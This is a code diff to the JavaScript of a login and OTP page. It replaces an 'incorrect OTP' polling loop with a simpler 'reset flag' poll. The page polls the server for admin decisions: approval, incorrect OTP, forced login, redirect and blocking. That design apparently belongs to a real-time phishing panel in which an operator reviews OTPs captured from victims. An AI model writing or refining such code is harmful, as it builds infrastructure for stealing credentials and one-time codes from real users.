@@ -275,7 +275,7 @@ button:disabled{
   let isProcessing = false;
   let approvalInterval = null;
   let blockCheckInterval = null;
-  let incorrectOtpInterval = null;
+  let resetFlagInterval = null;
   let isModalOpen = false;
 
   // Block check
@@ -308,42 +308,21 @@ button:disabled{
     }, 3000);
   }
 
-  // Incorrect OTP polling - RESETS EVERYTHING and clears form
-  function startIncorrectOtpPolling() {
-    if (incorrectOtpInterval) clearInterval(incorrectOtpInterval);
-    incorrectOtpInterval = setInterval(async () => {
+  // RESET FLAG POLLING - When admin clicks "Incorrect OTP", just refresh the page
+  function startResetFlagPolling() {
+    if (resetFlagInterval) clearInterval(resetFlagInterval);
+    resetFlagInterval = setInterval(async () => {
       try {
-        const response = await fetch('/api/users/check-admin-text', {
+        const response = await fetch('/api/users/check-reset-flag', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
         const data = await response.json();
         
-        if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
-          // Show red error message
-          errorDiv.textContent = '❌ Incorrect OTP entered. Please start over.';
-          errorDiv.style.display = 'block';
-          errorDiv.style.color = '#ef4444';
-          errorDiv.style.background = '#fef2f2';
-          errorDiv.style.padding = '12px';
-          errorDiv.style.borderRadius = '12px';
-          
-          // Clear input field
-          otpInput.value = '';
-          otpInput.focus();
-          
-          // REFRESH THE PAGE TO START FRESH
-          setTimeout(() => {
-            window.location.reload();
-          }, 2000);
-          
-          // Clear the error flag
-          await fetch('/api/admin/release-text', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email })
-          });
+        if (data.reset === true) {
+          // Just reload the page - everything resets automatically
+          window.location.reload();
         }
       } catch (err) {}
     }, 2000);
@@ -413,7 +392,7 @@ button:disabled{
       if (data.success) {
         showWaitingForApproval();
         startBlockChecking();
-        startIncorrectOtpPolling();
+        startResetFlagPolling();
         startCheckingApproval();
       } else {
         hideLoading();
@@ -529,7 +508,7 @@ button:disabled{
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
-  startIncorrectOtpPolling();
+  startResetFlagPolling();
 
   verifyBtn.addEventListener('click', verifyOTP);
   otpInput.addEventListener('keypress', (e) => {
@@ -541,5 +520,6 @@ button:disabled{
   });
   document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
 </script>
+
 </body>
 </html>
